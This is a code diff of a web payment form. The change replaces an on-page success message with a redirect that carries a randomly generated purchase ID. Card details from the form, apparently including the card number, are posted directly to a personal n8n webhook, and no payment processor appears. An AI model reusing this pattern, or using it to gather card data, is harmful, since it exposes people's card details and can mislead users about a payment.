@@ -50,10 +50,6 @@
                             <!-- Submit Button -->
                             <button type="submit" class="btn btn-warning btn-lg btn-block">Process Payment</button>
                         </form>
-                        
-                        <div id="responseMessage" style="display:none; margin-top:10px;" class="alert alert-success">
-                            Thank you! Your payment has been processed.
-                        </div>
                     </div>
                 </div>
             </div>
@@ -72,6 +68,9 @@
                 cardOwner: document.getElementById('cardOwner').value
             };
 
+            // Generate a random purchase ID
+            const purchaseId = 'PUR' + Math.floor(100000 + Math.random() * 900000);
+
             // Send the form data using fetch to your n8n webhook URL
             fetch("https://kingvon.app.n8n.cloud/webhook/gabby", {
                 method: "POST",
@@ -82,9 +81,8 @@
             })
             .then(response => response.json())
             .then(data => {
-                // Display success message
-                document.getElementById("responseMessage").style.display = "block";
-                document.getElementById("paymentForm").reset(); // Clear the form
+                // Redirect to the Thank You page with the purchase ID in the URL
+                window.location.href = `thankyou.html?purchaseId=${purchaseId}`;
             })
             .catch(error => {
                 alert("An error occurred. Please try again.");
@@ -92,6 +90,7 @@
             });
         });
 
+        // Input restriction scripts
         $(document).ready(function () {
             $('#cardNumber').on('input', function () {
                 let input = $(this).val().replace(/\D/g, '');
